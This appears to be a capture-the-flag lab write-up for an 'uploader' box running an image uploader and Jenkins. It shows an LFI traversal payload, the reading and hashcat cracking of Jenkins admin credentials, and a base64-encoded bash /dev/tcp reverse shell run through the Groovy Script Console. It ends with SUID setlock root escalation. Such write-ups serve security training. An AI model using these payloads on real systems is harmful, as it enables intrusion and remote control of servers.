Only ports 80, 8080, and 22 are open.

## Enumeration

`http://172.16.10.47:80`

An image upload application.

![uploader](/static/images/uploader-writeup-images/image.png)

`http://172.16.10.47:8080`

Application running Jenkins.

I tried some default credentials, but was unsuccessful.

### Voltando ao servidor web na porta 80

I tried to use the feature to upload a PHP web shell, but it didn’t work as the application is validating.

![uploader 2](/static/images/uploader-writeup-images/image2.png)

So, I captured the request with Burp and started testing for LFI.

`....//....//....//....//....//....//etc/passwd`

![uploader 3](/static/images/uploader-writeup-images/image3.png)

LFI Found!

I tried escalating the LFI to RCE using log poisoning, but it was unsuccessful 😞.

Since the application running on port 8080 is Jenkins, we’ll use the LFI to read the server’s configuration files.

`/var/lib/jenkins/users/users.xml`

![uploader 4](/static/images/uploader-writeup-images/image4.png)

According to the **users.xml** file, there is another directory called **admin_10281833997561721098**. Inside this directory, we can access the Jenkins configuration file.

`/var/lib/jenkins/users/admin_10281833997561721098/config.xml`

![uploader 5](/static/images/uploader-writeup-images/image5.png)

With the hash in hand, we’ll use hashcat to try to crack it.

`hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt`

![uploader 6](/static/images/uploader-writeup-images/image6.png)

With the credentials **admin:ginger1**, we were able to log in to Jenkins.

## Foot Hold

Jenkins has a feature called **'Script Console'**, which we can exploit to run a reverse shell using Groovy Script.

`http://172.16.10.47:8080/manage/script`

![uploader 8](/static/images/uploader-writeup-images/image8.png)

In this case, the application does not execute the reverse shell for some reason, so the workaround was to encode the payload in base64 to make it work.

`echo "bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'" | base64`

![uploader 9](/static/images/uploader-writeup-images/image9.png)

Now just send it and grab the shell.

```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMC4zMS4xNTAvMTMzNyA8JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

## Privillege Escalation

SUID `setlock`

`find / -type f -perm -04000 -ls 2>/dev/null`

![uploader 12](/static/images/uploader-writeup-images/image12.png)

`/usr/bin/setlock - /bin/sh -p`
